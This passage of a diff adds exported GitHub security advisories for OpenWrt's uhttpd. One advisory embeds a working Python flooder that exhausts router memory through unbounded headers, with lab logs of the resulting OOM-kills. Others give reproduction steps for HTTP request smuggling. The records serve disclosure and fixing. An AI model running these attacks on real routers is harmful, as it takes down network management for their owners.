ERROR_PARAMS);\r\n```\r\n\r\nSeparately worth hardening `blobmsg_add_field()`'s `unsigned int len` in libubox so the next such\r\ncaller does not inherit the same primitive — I am reporting that to libubox as its own item.",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jow-",
+      "id": 2528802,
+      "node_id": "MDQ6VXNlcjI1Mjg4MDI=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/2528802?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jow-",
+      "html_url": "https://github.com/jow-",
+      "followers_url": "https://api.github.com/users/jow-/followers",
+      "following_url": "https://api.github.com/users/jow-/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jow-/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jow-/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jow-/subscriptions",
+      "organizations_url": "https://api.github.com/users/jow-/orgs",
+      "repos_url": "https://api.github.com/users/jow-/repos",
+      "events_url": "https://api.github.com/users/jow-/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jow-/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-2mpg-6wp5-435p",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:46:34Z",
+    "published_at": "2026-08-03T08:03:12Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "uhttpd"
+        },
+        "vulnerable_version_range": "all revisions up to and including f682ccab (ubus.c byte-identical since 3864c08)",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/e76736e5676fb25536b27d45865eb4153c68aca3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-191",
+        "name": "Integer Underflow (Wrap or Wraparound)"
+      },
+      {
+        "cwe_id": "CWE-787",
+        "name": "Out-of-bounds Write"
+      },
+      {
+        "cwe_id": "CWE-843",
+        "name": "Access of Resource Using Incompatible Type"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-191",
+      "CWE-787",
+      "CWE-843"
+    ],
+    "credits": [
+      {
+        "login": "JuliusBairaktaris",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "JuliusBairaktaris",
+          "id": 33199500,
+          "node_id": "MDQ6VXNlcjMzMTk5NTAw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/33199500?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/JuliusBairaktaris",
+          "html_url": "https://github.com/JuliusBairaktaris",
+          "followers_url": "https://api.github.com/users/JuliusBairaktaris/followers",
+          "following_url": "https://api.github.com/users/JuliusBairaktaris/following{/other_user}",
+          "gists_url": "https://api.github.com/users/JuliusBairaktaris/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/JuliusBairaktaris/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/JuliusBairaktaris/subscriptions",
+          "organizations_url": "https://api.github.com/users/JuliusBairaktaris/orgs",
+          "repos_url": "https://api.github.com/users/JuliusBairaktaris/repos",
+          "events_url": "https://api.github.com/users/JuliusBairaktaris/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/JuliusBairaktaris/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vhx4-3p5q-m59q",
+    "cve_id": "CVE-2026-102338",
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-vhx4-3p5q-m59q",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-vhx4-3p5q-m59q",
+    "summary": "uhttpd — pre-auth HTTP header-accumulation memory-exhaustion DoS",
+    "description": "## Summary\r\n\r\nuhttpd's per-request header parser imposes **no cap on header count** and **no cap on cumulative\r\nheader bytes** — only a ~4096-byte per-*line* limit. Each parsed header line is appended to a\r\nlibubox `blob_buf` (`cl->hdr`) that grows on the heap. A single connection saturates at the libubox\r\nblob length-mask ceiling (~16 MiB), so the realised DoS is the **aggregate** of\r\n`max_connections × ~16 MiB`. With the default `-N 100`, a handful of concurrent keep-alive\r\nconnections that stream headers toward the cap (and never send the terminating empty line) exhaust\r\nrouter RAM and OOM-kill the daemon. Confirmed on a live OpenWrt 25.12.4 lab: **uhttpd OOM-killed 4\r\ntimes**, peak RSS 319 MiB, `MemAvailable` 378 MiB → 14 MiB, the web-management plane unresponsive.\r\n\r\nThis is a **default-config, pre-auth, no-auth remote denial of service** of the web-management plane\r\n(LuCI UI + `/ubus` RPC).\r\n\r\n## Environment / affected range\r\n\r\n- **Component:** uhttpd (`package/network/services/uhttpd`).\r\n- **Hunt corpus:** uhttpd `main` @ `1b624f8f814ed568608d756512892416e0431d77`\r\n  (`PKG_SOURCE_DATE=2026-05-21`), pristine upstream (zero OpenWrt patches) — this is an upstream\r\n  uhttpd bug.\r\n- **Live-validated build:** OpenWrt **25.12.4**, uhttpd **2025.10.03~ebb92e6b-r1** (x86/64, musl),\r\n  binary sha256 `1d69fd5256130cded1ca5d9550e9c5b2b13e24c74572e55ac9782a1b0d7de607`.\r\n- **Affected:** effectively all web-managed OpenWrt installs that ship this uhttpd, **including\r\n  current upstream master `7b1bec4`**; the header-accumulation path is long-standing and\r\n  behaviorally identical across releases. uhttpd sets no `PKG_CPE_ID` (please add one for CVE\r\n  tracking).\r\n- **CWE-400 / CWE-770** (uncontrolled resource consumption / missing limit on resource allocation).\r\n\r\n## Topology\r\n\r\nThe attack rides the LAN; the request is N concurrent connections, each streaming unbounded headers\r\ntoward the per-connection blob cap and never sending the terminating empty line.\r\n\r\n```\r\n                         LAN segment  br-lan  10.0.2.0/24\r\n                         (fw4 zone lan: input ACCEPT — no auth gate)\r\n  +------------------------+                                    +---------------------------------+\r\n  |  Attacker VM (Debian)  |   N concurrent conns, each         |  OpenWrt target / DUT 25.12.4   |\r\n  |  10.0.2.8              |   streaming unbounded headers      |  10.0.2.2                       |\r\n  |  PoC: exploit_client-002 |  ------------------------------> |  uhttpd -h /www -x /cgi-bin     |\r\n  +------------------------+   pre-auth, no credentials         |         -u /ubus  (+ LuCI/rpc)  |\r\n                                                                +---------------------------------+\r\n       WAN eth1 10.0.3.x  (fw4 zone wan: input REJECT)  -- not used; attack rides the LAN --\r\n```\r\n\r\n## Upstream status (checked 2026-06-22)\r\n\r\n**Confirmed UNFIXED on upstream master `7b1bec4` (2026-06-22).** There is no header **count** cap\r\nand no cumulative-header-**bytes** cap anywhere in `client.c` / `uhttpd.h`; headers still accrue\r\nuncapped via `blobmsg_add_string(&cl->hdr, …)` at `client.c:450`. The three request-smuggling fixes\r\nlanded on master since our hunt corpus (`ae015e0` reject unhandled Transfer-Encoding; `b78f518`\r\nclose on invalid chunk length; `7b1bec4` close on POST-body parse error) are unrelated to this\r\nresource-exhaustion defect and do not touch the header-accumulation path.\r\n\r\n## Root cause (file:line, from the pre-auth socket)\r\n\r\nCall path, looped per header line and terminated only by the empty line (`client.c:371`):\r\n\r\n```\r\nsocket -> uh_accept_client -> uh_client_read_cb -> client_header_cb\r\n       -> client_parse_header (client.c:364) -> blobmsg_add_string(&cl->hdr, ...) (client.c:442)\r\n```\r\n\r\nNo auth gate sits in the header-accumulation loop. Per-connection growth is bounded by the libubox\r\nblob ceiling — `blob_buf_grow` refuses to grow once `required > BLOB_ATTR_LEN_MASK - buflen`\r\n(`blob.c:73`, `BLOB_ATTR_LEN_MASK = 0x00ffffff` = ~16 MiB); at the cap `blob_add` returns NULL and\r\n`blobmsg_add_string` fails **gracefully** (no abort, no integer wrap). So a single connection\r\nsaturates at ~16 MiB — the DoS is the **aggregate** `max_connections × ~16 MiB`. uhttpd is\r\nsingle-threaded, so even before OOM the realloc-copying of growing 16 MiB blobs stalls the event\r\nloop.\r\n\r\n## Steps to reproduce\r\n\r\nPer connection, after the request line, stream many ~4 KB header lines and **never** send the\r\nterminating empty line (hold the connection in the header phase; the network timeout re-arms per\r\nline). Open many such connections concurrently.\r\n\r\n```\r\nGET / HTTP/1.1\\r\\n\r\nHost: 10.0.2.2\\r\\n\r\nX-Pad-0001: <~4000 bytes of 'A'>\\r\\n\r\nX-Pad-0002: <~4000 bytes of 'A'>\\r\\n\r\n...   (~4000 lines reach the ~16 MiB blob cap per connection)\r\n```\r\n\r\nPoC (threaded raw-socket flooder + SSH RSS/MemAvailable monitor + a `MemAvailable < 60 MiB` safety\r\nfloor so only the fattest process is OOM-reaped and SSH stays alive):\r\n\r\n```sh\r\ncd results/uhttpd/exploits/client-002\r\npython3 exploit_client_002_memexhaust.py            # see script header for --mode single|aggregate\r\n```\r\n\r\n## Evidence\r\n\r\n**Single mode (per-connection 16 MiB plateau):** one connection streaming `X-Pad-NNNNNN` lines drove\r\nuhttpd VmRSS `1712 kB -> 18108 kB (+16.0 MiB)` then **plateaued** (RSS stopped growing while bytes\r\nkept flowing) — confirming `blob_buf_grow` refuses past the 16 MiB length-mask. On close VmRSS\r\nreturned to 1708 kB. (`run1_single_client_002.log`.)\r\n\r\n**Aggregate mode → real availability loss (the A:H proof):** ~30 concurrent header-accumulating\r\nconnections drove peak uhttpd VmRSS 319 MiB, `MemAvailable` 378 MiB → 14 MiB (no swap), and **uhttpd\r\nwas OOM-killed 4 times**. Kernel log (`target_client_002.log`):\r\n\r\n```\r\n[22805.862227] oom-kill:...task=uhttpd,pid=20465,uid=0\r\n[22805.862227] Out of memory: Killed process 20465 (uhttpd) total-vm:365376kB, anon-rss:363476kB ...\r\n[22814.779763] Out of memory: Killed process 20938 (uhttpd) total-vm:353736kB, anon-rss:351744kB ...\r\n[22825.822403] Out of memory: Killed process 21003 (uhttpd) total-vm:364568kB, anon-rss:362624kB ...\r\n[22835.558738] Out of memory: Killed process 21076 (uhttpd) total-vm:323044kB, anon-rss:321152kB ...\r\n```\r\n\r\n**16 legitimate `GET /` probes left unresponsive** during the attack (single-threaded event-loop\r\nstall + OOM windows) = the realised availability loss. (`run2_aggregate_client_002.log`,\r\n`exec_client_002.log`.) The lab has ~483 MiB RAM — **larger** than a typical 64-256 MiB OpenWrt\r\nrouter — yet OOM still fired; a 64 MiB box OOMs at roughly four saturated connections. Packet\r\ncaptures: `capture_client_002.pcap`, `capture_client_002_aggregate.pcap`. The lab fully recovered\r\nafterward (`GET / -> 200`, uhttpd respawned by procd).\r\n\r\n## Exploit execution\r\n\r\nSalient transcript from `exec_client_002.log` — RUN 1 shows the single-connection RSS climb and the\r\n16 MiB plateau; RUN 2 shows the aggregate `MemAvailable` collapse, the unresponsive `GET /` probes,\r\nand the kernel OOM-killing uhttpd by name 4 times:\r\n\r\n```\r\n## RUN 1 — SINGLE-CONNECTION growth proof (proves the 16 MiB/conn cap)\r\n[*] lab uhttpd pid=20465  baseline VmRSS=1712 kB\r\n    t=  0.1s  lines=   200  sent=  0.77 MiB  VmRSS=2512 kB  (+800 kB over baseline)\r\n    ...\r\n    t=  2.3s  lines=  4200  sent= 16.09 MiB  VmRSS=18108 kB  (+16396 kB over baseline)\r\n[+] VmRSS PLATEAUED at ~18108 kB after sending 18.4 MiB -> blob_buf 16 MiB cap hit (grow fails gracefully; no abort).\r\n[*] post-close VmRSS=1708 kB (frees when conn closes / 60s timeout fires)\r\n\r\n## RUN 2 — AGGREGATE exhaustion (the A:H demonstration)\r\n[*] lab uhttpd pid=20465  baseline VmRSS=1712 kB  MemAvailable=378600 kB\r\n    t=  1.4s live= 75  sent=    0.0MiB pid=20465 VmRSS=2216kB  MemAvail=378488kB resp=ok(HTTP/1.0 200 OK)\r\n    t=  7.4s live=168 sent=   51.1MiB pid=20465 VmRSS=2396kB  MemAvail=378144kB resp=timeout()\r\n    t= 13.3s live=168 sent=  133.5MiB pid=20465 VmRSS=79644kB MemAvail=291960kB resp=timeout()\r\n    t= 25.4s live=166 sent=  284.5MiB pid=20465 VmRSS=156976kB MemAvail=204976kB resp=timeout()\r\n    t= 33.0s live= 68 sent=  580.9MiB pid=20465 VmRSS=319048kB MemAvail=38992kB  resp=ok(HTTP/1.0 200 OK)\r\n[!] SAFETY FLOOR HIT: MemAvailable=38992kB < 60000kB -> BACKING OFF (closing attack conns)\r\n\r\n# Kernel OOM-killer fired on uhttpd by name (dmesg / logread) — 4 times:\r\n[22805.862227] Out of memory: Killed process 20465 (uhttpd) total-vm:365376kB, anon-rss:363476kB ...\r\n[22814.779763] Out of memory: Killed process 20938 (uhttpd) total-vm:353736kB, anon-rss:351744kB ...\r\n[22825.822403] Out of memory: Killed process 21003 (uhttpd) total-vm:364568kB, anon-rss:362624kB ...\r\n[22835.558738] Out of memory: Killed process 21076 (uhttpd) total-vm:323044kB, anon-rss:321152kB ...\r\n\r\n========== AGGREGATE RESULT ==========\r\n  baseline uhttpd VmRSS : 1712 kB     PEAK uhttpd VmRSS : 319048 kB  (+317336 kB)\r\n  baseline MemAvailable : 378600 kB   MIN  MemAvailable : 14216 kB  (consumed 364384 kB)\r\n  unresponsive probes   : 16 (timeout/reset/refused/empty during attack)\r\n  OOM-kill observed     : True   uhttpd pid changed : True (procd respawn after OOM-kill)\r\n  FINAL pid=21141 resp=ok(HTTP/1.0 200 OK)   # lab recovered after attack\r\n======================================\r\n```\r\n\r\n## Proof-of-concept (embedded)\r\n\r\nSimplified, self-contained aggregate flooder (stdlib only). It opens N concurrent connections, each\r\nstreaming ~4 KB header lines and never sending the terminating empty line, so each connection pins a\r\ngrowing `cl->hdr` blob; the aggregate exhausts router RAM. Faithful to the run above with the\r\ncampaign's SSH-monitor and `MemAvailable` safety-floor plumbing stripped — run only against an\r\nisolated lab DUT.\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n# uhttpd client-002 — pre-auth header-accumulation memory-exhaustion DoS.\r\n# Opens N concurrent connections, each streams unbounded ~4 KB header lines and\r\n# NEVER sends the terminating empty line, so each cl->hdr blob grows (~16 MiB cap\r\n# per conn); the aggregate OOM-kills uhttpd. Isolated lab only.\r\nimport socket, sys, threading, time\r\n\r\nTARGET = \"10.0.2.2\"\r\nPORT   = 80\r\nCONNS  = 30          # concurrent header-streaming connections\r\nPAD    = 4000        # bytes of 'A' per header value (stays under the 4096 line cap)\r\nMAXLN  = 6000        # ~4000 lines reaches the ~16 MiB blob cap per connection\r\n\r\ndef flood():\r\n    while True:\r\n        try:\r\n            s = socket.create_connection((TARGET, PORT), timeout=6)\r\n            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\r\n            s.sendall(b\"GET / HTTP/1.1\\r\\nHost: %b\\r\\n\" % TARGET.encode())\r\n            for i in range(MAXLN):                       # NO terminating empty line\r\n                s.sendall(b\"X-Pad-%06d: \" % i + b\"A\" * PAD + b\"\\r\\n\")\r\n        except OSError:\r\n            time.sleep(0.05)                             # reopen and keep the pressure on\r\n\r\nif __name__ == \"__main__\":\r\n    print(\"[*] flooding %s:%d with %d header-accumulation conns\" % (TARGET, PORT, CONNS))\r\n    for _ in range(CONNS):\r\n        threading.Thread(target=flood, daemon=True).start()\r\n    time.sleep(60)\r\n```\r\n\r\n## Full artifacts\r\n\r\nThe complete original exploit script(s) and raw evidence (full logs, pcap, ASan output, any core)\r\nare not inlined here; they can be provided separately to the maintainers by email on request.\r\n\r\n## Impact and severity\r\n\r\nRemote pre-auth DoS of the web-management plane via OOM / event-loop stall. No memory disclosure, no\r\nintegrity violation, no escalation to a write/RCE (the blob cap rejects over-cap growth rather than\r\nwrapping).\r\n\r\n**Confirmed:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = **7.5 (High)**.\r\n\r\n## Suggested fix\r\n\r\nAdd a per-request cap on header **count** and on cumulative header **bytes** (reject with `431` /\r\n`413` once exceeded) in `client_parse_header` before `blobmsg_add_string`, and/or a per-connection\r\nheader-phase byte budget — so a single connection cannot pin a 16 MiB allocation and the connection\r\npool cannot aggregate to RAM exhaustion.\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jow-",
+      "id": 2528802,
+      "node_id": "MDQ6VXNlcjI1Mjg4MDI=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/2528802?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jow-",
+      "html_url": "https://github.com/jow-",
+      "followers_url": "https://api.github.com/users/jow-/followers",
+      "following_url": "https://api.github.com/users/jow-/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jow-/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jow-/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jow-/subscriptions",
+      "organizations_url": "https://api.github.com/users/jow-/orgs",
+      "repos_url": "https://api.github.com/users/jow-/repos",
+      "events_url": "https://api.github.com/users/jow-/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jow-/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-vhx4-3p5q-m59q",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-102338",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:44:16Z",
+    "published_at": "2026-07-21T22:31:10Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "uhttpd"
+        },
+        "vulnerable_version_range": "main",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/f6c2fcfa539de49ddf6de8f805110c8804602e98",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-400",
+      "CWE-770"
+    ],
+    "credits": [
+      {
+        "login": "puru1761",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "puru1761",
+          "id": 32076726,
+          "node_id": "MDQ6VXNlcjMyMDc2NzI2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/32076726?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/puru1761",
+          "html_url": "https://github.com/puru1761",
+          "followers_url": "https://api.github.com/users/puru1761/followers",
+          "following_url": "https://api.github.com/users/puru1761/following{/other_user}",
+          "gists_url": "https://api.github.com/users/puru1761/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/puru1761/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/puru1761/subscriptions",
+          "organizations_url": "https://api.github.com/users/puru1761/orgs",
+          "repos_url": "https://api.github.com/users/puru1761/repos",
+          "events_url": "https://api.github.com/users/puru1761/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/puru1761/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-wgwp-64hh-f52p",
+    "cve_id": "CVE-2026-55613",
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-wgwp-64hh-f52p",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-wgwp-64hh-f52p",
+    "summary": "HTTP request smuggling via ubus POST body parse-error desync",
+    "description": "Location: ubus.c:945, function uh_ubus_data_sendSeverity: Medium (CVSS 3.1 ~5.9)\r\n\r\nDescription:\r\n\r\nWhen a POST to /ubus delivers the body in multiple TCP segments, thefirst fragment can complete a JSON object ({}), causing du->jsobj tobecome non-NULL. When the next fragment arrives, uh_ubus_data_send() hitsthe existing-object error path: it emits a JSON-RPC parse error and returns0 (zero bytes consumed). The caller does not drain the remaining declaredContent-Length bytes and does not set connection_close, so the unreadbody suffix is parsed as a new HTTP request on the same keep-aliveconnection.\r\n\r\nThis differs from the two previously reported bugs:\r\n\r\n    #1 (TE case-sensitivity) is in HTTP header parsing\r\n\r\n    #2 (chunk-length reset) is in chunked transfer-coding handling\r\n\r\n    This bug is in the ubus application-layer body handler\r\n\r\nReproduction:\r\n\r\nSend a POST to /ubus with Content-Type: application/json andContent-Length covering both a {} prefix and a smuggled GET / HTTP/1.1suffix. Deliver the {} in the first TCP segment, pause briefly (~100ms),then send the remainder. The server returns two responses on the sameconnection: a JSON-RPC parse error and a 200 OK directory listing fromthe smuggled GET.\r\n\r\nSuggested fix:\r\n\r\nSet connection_close in the ubus parse-error path before callingrequest_done:\r\n\r\n // ubus.c — error path of uh_ubus_data_send():\r\n   cl->request.connection_close = true;\r\n\r\nOr have uh_request_done() drain any remaining body bytes whencontent_length > 0.\r\nGeneral notes\r\n\r\n    This was found through the same automated static analysis + runtimevalidation methodology as the previous report.\r\n\r\n    The /ubus endpoint is enabled by default in OpenWrt, so any standardOpenWrt deployment behind a reverse proxy or CDN is potentially affected.\r\n\r\n    I have a complete PoC script (Python, ~130 lines) that builds uhttpd withubus support and demonstrates the two-response output. Attached in the email with some other artifacts.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "hauke",
+      "id": 78494,
+      "node_id": "MDQ6VXNlcjc4NDk0",
+      "avatar_url": "https://avatars.githubusercontent.com/u/78494?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/hauke",
+      "html_url": "https://github.com/hauke",
+      "followers_url": "https://api.github.com/users/hauke/followers",
+      "following_url": "https://api.github.com/users/hauke/following{/other_user}",
+      "gists_url": "https://api.github.com/users/hauke/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/hauke/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/hauke/subscriptions",
+      "organizations_url": "https://api.github.com/users/hauke/orgs",
+      "repos_url": "https://api.github.com/users/hauke/repos",
+      "events_url": "https://api.github.com/users/hauke/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/hauke/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-wgwp-64hh-f52p",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-55613",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:42:19Z",
+    "published_at": "2026-06-29T23:00:39Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "< 1b624f8f814ed568608d756512892416e0431d77",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/7b1bec45826bd78c8afc993435bdc0f1df2fe399",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+      {
+        "login": "dyingc",
+        "type": "analyst"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "dyingc",
+          "id": 28287426,
+          "node_id": "MDQ6VXNlcjI4Mjg3NDI2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/28287426?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/dyingc",
+          "html_url": "https://github.com/dyingc",
+          "followers_url": "https://api.github.com/users/dyingc/followers",
+          "following_url": "https://api.github.com/users/dyingc/following{/other_user}",
+          "gists_url": "https://api.github.com/users/dyingc/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/dyingc/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/dyingc/subscriptions",
+          "organizations_url": "https://api.github.com/users/dyingc/orgs",
+          "repos_url": "https://api.github.com/users/dyingc/repos",
+          "events_url": "https://api.github.com/users/dyingc/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/dyingc/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 4,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-p55c-rmhc-qfm5",
+    "cve_id": "CVE-2026-55612",
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-p55c-rmhc-qfm5",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-p55c-rmhc-qfm5",
+    "summary": "HTTP request smuggling via invalid chunk-length state reset",
+    "description": "Location: client.c:500, function client_poll_post_dataIntroduced: commit b7c85a28 (2013-01-03, \"implement proper flow controlfor relaying postdata\")Severity: High (CVSS 3.1 ~8.1)\r\n\r\nDescription:\r\n\r\nWhen client_poll_post_data() encounters an invalid chunk-length line(e.g., a value exceeding INT_MAX), it consumes only the chunk-size line,then clears both r->content_length and r->transfer_chunked to zero.This makes the completion check treat the request as finished. However, theremaining body data is not drained and request.connection_close is notset, so the keep-alive parser re-enters CLIENT_STATE_INIT and parsesthe leftover body bytes as a new HTTP request.\r\n\r\nAn attacker can embed a complete HTTP request inside the body of a chunkedPOST. By using an oversized hexadecimal chunk-length (e.g., 80000000)that triggers the invalid-chunk branch, the embedded bytes are cleanlyaligned as a valid second request.\r\n\r\nReproduction:\r\n\r\nSend a chunked POST with a valid first chunk (1\\r\\nA\\r\\n), then anoversized chunk-length line (80000000\\r\\n), followed by a completeGET /target HTTP/1.1\\r\\n... embedded in the body. The server respondsto the POST (truncated body A), then processes the embedded GET as aseparate request on the same connection.\r\n\r\nSuggested fix:\r\n\r\nForce connection close on invalid chunk-length:\r\n```\r\n   r->content_length = 0;\r\n   r->transfer_chunked = 0;\r\n + cl->request.connection_close = true;\r\n```\r\nOr drain all remaining buffered data before allowing keep-alive reuse.\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "hauke",
+      "id": 78494,
+      "node_id": "MDQ6VXNlcjc4NDk0",
+      "avatar_url": "https://avatars.githubusercontent.com/u/78494?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/hauke",
+      "html_url": "https://github.com/hauke",
+      "followers_url": "https://api.github.com/users/hauke/followers",
+      "following_url": "https://api.github.com/users/hauke/following{/other_user}",
+      "gists_url": "https://api.github.com/users/hauke/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/hauke/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/hauke/subscriptions",
+      "organizations_url": "https://api.github.com/users/hauke/orgs",
+      "repos_url": "https://api.github.com/users/hauke/repos",
+      "events_url": "https://api.github.com/users/hauke/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/hauke/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-p55c-rmhc-qfm5",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-55612",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:41:40Z",
+    "published_at": "2026-06-29T23:01:53Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "< 1b624f8f814ed568608d756512892416e0431d77",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/b78f518478794e16ba3568fc1258e40bf3e8eb3b",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+      {
+        "login": "dyingc",
+        "type": "analyst"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "dyingc",
+          "id": 28287426,
+          "node_id": "MDQ6VXNlcjI4Mjg3NDI2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/28287426?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/dyingc",
+          "html_url": "https://github.com/dyingc",
+          "followers_url": "https://api.github.com/users/dyingc/followers",
+          "following_url": "https://api.github.com/users/dyingc/following{/other_user}",
+          "gists_url": "https://api.github.com/users/dyingc/gists{/gist_id}",
